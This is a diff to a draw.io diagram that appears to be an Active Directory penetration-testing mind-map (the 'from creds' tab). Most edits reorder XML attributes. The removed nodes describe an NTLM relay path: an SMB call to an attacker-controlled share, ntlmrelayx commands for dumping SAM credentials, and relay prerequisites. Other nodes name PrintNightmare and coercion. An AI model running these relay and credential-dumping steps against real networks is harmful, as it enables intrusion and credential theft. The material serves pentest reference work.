@@ -608,7 +608,7 @@
     </mxGraphModel>
   </diagram>
   <diagram name="from creds" id="DHAbqxUyTUS8Uim03K_V">
-    <mxGraphModel dx="2876" dy="1133" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
+    <mxGraphModel dx="2514" dy="933" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -673,7 +673,7 @@
         <mxCell id="oKsRqKfM7M-z2aODvvs5-1" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="orcKsDgMiDMdKtN4nEvD-1" target="5y5mrsRL2AuuEaPEtIoS-27" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="Zl1azVjz_Hir06-zNHVM-2" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.75;exitY=0;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="orcKsDgMiDMdKtN4nEvD-1" target="Zl1azVjz_Hir06-zNHVM-1">
+        <mxCell id="Zl1azVjz_Hir06-zNHVM-2" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.75;exitY=0;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="orcKsDgMiDMdKtN4nEvD-1" target="Zl1azVjz_Hir06-zNHVM-1" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="orcKsDgMiDMdKtN4nEvD-1" value="&lt;div style=&quot;font-size: 13px;&quot;&gt;Valid account on the domain&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;fontSize=13;fillColor=#60a917;strokeColor=#2D7600;fontColor=#ffffff;" parent="1" vertex="1">
@@ -931,76 +931,17 @@
         <mxCell id="PTz_sH_h7iwSk9bTQDM_-1" value="abuse trusted links" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="87.5" y="1450" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="591YWBLoRLkE_oBIO_oH-2" style="edgeStyle=none;curved=1;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fontSize=12;startSize=8;endSize=8;" parent="1" source="NJeiJBOZSVMHtop_wW8c-31" edge="1">
-          <mxGeometry relative="1" as="geometry">
-            <mxPoint x="-320" y="2002.5" as="targetPoint" />
-          </mxGeometry>
-        </mxCell>
-        <mxCell id="NJeiJBOZSVMHtop_wW8c-31" value="SMB call on the session to the evil SMB&lt;br&gt;&lt;br&gt;&lt;pre class=&quot;fence-code has-commands&quot; id=&quot;fence-code-30&quot;&gt;&lt;font color=&quot;#2a7bde&quot;&gt;&lt;code class=&quot;hljs&quot;&gt;&lt;span aria-describedby=&quot;__bv_tooltip_5086__ __bv_tooltip_5091__&quot; id=&quot;local_id_745&quot; class=&quot;code-block-ui&quot;&gt;dir \\192.168.119.2\test&lt;/span&gt;&lt;/code&gt;&lt;/font&gt;&lt;/pre&gt;" style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;" parent="1" vertex="1">
-          <mxGeometry x="-563" y="1945" width="223" height="117.5" as="geometry" />
-        </mxCell>
-        <mxCell id="MMLIt14sY60JNd-TKhzJ-6" style="edgeStyle=none;curved=1;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.25;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fontSize=12;startSize=8;endSize=8;" parent="1" source="NJeiJBOZSVMHtop_wW8c-35" target="NJeiJBOZSVMHtop_wW8c-42" edge="1">
+        <mxCell id="Zl1azVjz_Hir06-zNHVM-4" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="Zl1azVjz_Hir06-zNHVM-1" target="Zl1azVjz_Hir06-zNHVM-3" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="MMLIt14sY60JNd-TKhzJ-7" style="edgeStyle=none;curved=1;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fontSize=12;startSize=8;endSize=8;" parent="1" source="NJeiJBOZSVMHtop_wW8c-35" target="WZbXyQnQLZRy0x0Um8Rj-3" edge="1">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <object label="&lt;div&gt;Relay de la session&lt;/div&gt;&lt;div&gt;&lt;pre class=&quot;fence-code has-commands&quot; id=&quot;fence-code-28&quot;&gt;&lt;font color=&quot;#2a7bde&quot;&gt;&lt;code class=&quot;hljs&quot;&gt;&lt;span aria-describedby=&quot;__bv_tooltip_5086__ __bv_tooltip_5091__&quot; id=&quot;local_id_742&quot; class=&quot;code-block-ui&quot;&gt;impacket-ntlmrelayx&lt;/span&gt;&lt;/code&gt;&lt;/font&gt;&lt;/pre&gt;&lt;/div&gt;" id="NJeiJBOZSVMHtop_wW8c-35">
-          <mxCell style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;strokeColor=#000000;" parent="1" vertex="1">
-            <mxGeometry x="200" y="1947.5" width="190" height="102.5" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="NJeiJBOZSVMHtop_wW8c-36" style="edgeStyle=none;curved=1;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;fontSize=14;startSize=8;endSize=8;" parent="1" edge="1">
-          <mxGeometry relative="1" as="geometry">
-            <mxPoint x="297.5" y="1940" as="sourcePoint" />
-            <mxPoint x="297.5" y="1940" as="targetPoint" />
-          </mxGeometry>
-        </mxCell>
-        <object label="credentials dump (SAM) if admin (local or domain)" cmd="ntlmrelayx -tf targets.txt -smb2support" id="NJeiJBOZSVMHtop_wW8c-42">
-          <mxCell style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" parent="1" vertex="1">
-            <mxGeometry x="500" y="1878.75" width="220" height="80" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="NJeiJBOZSVMHtop_wW8c-47" value="&lt;div&gt;Relay to SMB&lt;br&gt;&lt;/div&gt;&lt;br&gt;#Prerequisites :SMB Signing &lt;b&gt;not REQUIRED&lt;/b&gt;" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
-          <mxGeometry x="-275" y="1958.75" width="190" height="90" as="geometry" />
-        </mxCell>
-        <mxCell id="NJeiJBOZSVMHtop_wW8c-49" value="&lt;div&gt;Relay to HTTP&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;#no Prerequisites for HTTP&lt;/div&gt;" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
-          <mxGeometry x="-275" y="2100" width="215" height="90" as="geometry" />
-        </mxCell>
-        <mxCell id="NJeiJBOZSVMHtop_wW8c-52" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="NJeiJBOZSVMHtop_wW8c-53" target="NJeiJBOZSVMHtop_wW8c-54" edge="1">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="NJeiJBOZSVMHtop_wW8c-53" value="&lt;div&gt;Relay to LDAP&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
-          <mxGeometry x="-269.5" y="2360" width="209.5" height="80" as="geometry" />
-        </mxCell>
-        <mxCell id="NJeiJBOZSVMHtop_wW8c-54" value="&lt;div&gt;Prerequisites :&lt;/div&gt;&lt;div&gt;-signing not required&lt;br&gt;&lt;/div&gt;&lt;div&gt;- incoming NTLM auth over HTTP or&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;white-space: pre;&quot;&gt;&#x9;&lt;/span&gt;target vulnerable CVE 2019-1040 ; 2019-1166 ; ...&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;align=left;" parent="1" vertex="1">
-          <mxGeometry x="-10" y="2355" width="362" height="90" as="geometry" />
-        </mxCell>
-        <mxCell id="WZbXyQnQLZRy0x0Um8Rj-3" value="Shell if regular user" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
-          <mxGeometry x="500" y="1990" width="220" height="80" as="geometry" />
-        </mxCell>
-        <mxCell id="WZbXyQnQLZRy0x0Um8Rj-7" style="edgeStyle=none;curved=1;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;fontSize=12;startSize=8;endSize=8;" parent="1" source="WZbXyQnQLZRy0x0Um8Rj-5" target="NJeiJBOZSVMHtop_wW8c-31" edge="1">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="WZbXyQnQLZRy0x0Um8Rj-5" value="&lt;div style=&quot;font-size: 13px;&quot;&gt;Valid session on the domain&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;fontSize=13;fillColor=#60a917;strokeColor=#2D7600;fontColor=#ffffff;" parent="1" vertex="1">
-          <mxGeometry x="-780" y="1962.5" width="150" height="80" as="geometry" />
-        </mxCell>
-        <mxCell id="591YWBLoRLkE_oBIO_oH-3" value="&lt;div&gt;Relay to HTTPS&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;#EAP enabled for HTTPS&lt;/div&gt;" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
-          <mxGeometry x="-275" y="2230" width="215" height="105" as="geometry" />
-        </mxCell>
-        <object label="Construction d&#39;une liste de target SMB not signed avec CME" id="MMLIt14sY60JNd-TKhzJ-5">
-          <mxCell style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;strokeColor=#000000;" parent="1" vertex="1">
-            <mxGeometry x="-34" y="1951.25" width="190" height="102.5" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="Zl1azVjz_Hir06-zNHVM-4" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="Zl1azVjz_Hir06-zNHVM-1" target="Zl1azVjz_Hir06-zNHVM-3">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="Zl1azVjz_Hir06-zNHVM-1" value="Quick compromission CVE" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+        <mxCell id="Zl1azVjz_Hir06-zNHVM-1" value="Quick compromission CVE" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="-413" y="220" width="180" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="Zl1azVjz_Hir06-zNHVM-3" value="Print nightmare" style="whiteSpace=wrap;html=1;rounded=1;" vertex="1" parent="1">
+        <mxCell id="Zl1azVjz_Hir06-zNHVM-3" value="Print nightmare" style="whiteSpace=wrap;html=1;rounded=1;" parent="1" vertex="1">
           <mxGeometry x="-130" y="220" width="120" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="HUgT8opHQEEQBJ-Bt90d-1" value="&lt;div&gt;Coerce&lt;/div&gt;&lt;div&gt;see onglet from no creds&lt;br&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+          <mxGeometry x="-413" y="1650" width="130" height="70" as="geometry" />
         </mxCell>
       </root>
     </mxGraphModel>
